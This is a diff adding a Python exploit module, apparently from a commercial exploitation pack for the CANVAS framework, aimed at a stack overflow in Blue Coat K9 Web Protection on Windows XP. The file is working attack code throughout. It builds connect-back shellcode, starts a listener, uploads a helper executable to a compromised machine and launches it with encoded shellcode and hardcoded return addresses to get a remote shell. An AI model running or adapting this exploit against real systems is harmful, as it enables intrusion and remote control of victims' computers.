@@ -1,0 +1,163 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+import socket
+import time
+import struct
+import base64
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shelllistener import *
+from MOSDEF import mosdef
+import canvasengine
+
+# GUI info
+NAME = "Blue Coat K9 Web Protection 'Referer' Header Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Blue Coat K9 Web Protection 'Referer' Header"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "Blue Coat"
+DOCUMENTATION["Repeatability"] = "One time"
+DOCUMENTATION["Date public"] = "2008.07.31"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/30463"
+DOCUMENTATION["Versions Affected"] = "Blue Coat Systems K9 Web Protection 3.2.44"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2007-2952"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2952"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Local'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+   	0: ['Windows XP SP2/SP3 English', 0x77c35459, 0x7ff9f010], # 
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.version = 0
+        self.name = NAME   
+        self.badstring = "\x00\x0a\x0d\x3f"     
+        self.upload_filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_k9web/d2sec_k9web.exe"
+        self.gui_update = True
+        self.localip = "127.0.0.1"
+        self.localport = 5555
+        return
+
+    def gui_hook_function(self):        			
+        node = self.engine.localnode
+        node.getallips()		
+        itflist = node.interfaces.all_interfaces()
+			
+        for i in itflist:
+        	tmpifc = node.interfaces.get_interface(i)
+        	if tmpifc.activated:
+        		self.localip = tmpifc.ip
+						
+        info = [("localip", self.localip)]
+	
+        return info
+
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+
+    def createShellcode(self):				
+				return self.createSmallWin32Shellcode(self.localip, self.localport, subesp = 1000)
+
+    def run_attack(self,node):
+        self.node = node 
+        self.remote_filename = self.node.shell.getcwd() + "\\d2sec_k9web.exe"
+        
+        self.log(self.upload_filename)
+        self.log(self.remote_filename)
+        
+        ret = self.node.shell.upload(self.upload_filename, destfilename = self.remote_filename)
+        
+        os_name, esp, wri = targets[self.version]
+        
+        eip = struct.pack('<L', esp)
+        writable = struct.pack('<L', wri)        
+                 
+        if ret:
+        	ret = self.node.shell.dospawn('%s "%s" "%s" "%s"' % (self.remote_filename, base64.b64encode(self.shellcode), base64.b64encode(eip), base64.b64encode(writable) ))
+        	self.log('dospawn returned: %s'%(ret))                        
+        
+        return 1
+
+    def getArgs(self):        
+        self.localport = int(self.argsDict.get("localport", self.localport))
+        self.localip = self.argsDict.get("localip", self.localip)
+
+        return
+
+    def run(self):        
+        self.getArgs()
+        self.createShellcode()
+        
+        success = 0
+        
+        node = self.engine.localnode
+        node.getallips()
+        interface = node.interfaces.get_ip(self.localip)
+
+        self.callback = self.engine.start_listener(interface, canvasengine.WIN32MOSDEF, self.localport)
+         
+        for node in self.argsDict['passednodes']:
+	        if 'win32api' not in node.capabilities:
+	          self.log('Node %s not a Win32 node' % (node.getname()))
+	          continue
+                
+	        ret = self.run_attack(node)
+          
+	        if ret == 1:
+	        	success = 1
+                
+        return success
+
+    def usage(self):
+        print 'Usage: %s -v version -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+
+if __name__=='__main__':
+    print 'This win32 local module is meant to be run only within CANVAS'
+    app = theexploit()
+    ret = standard_callback_commandline(app)
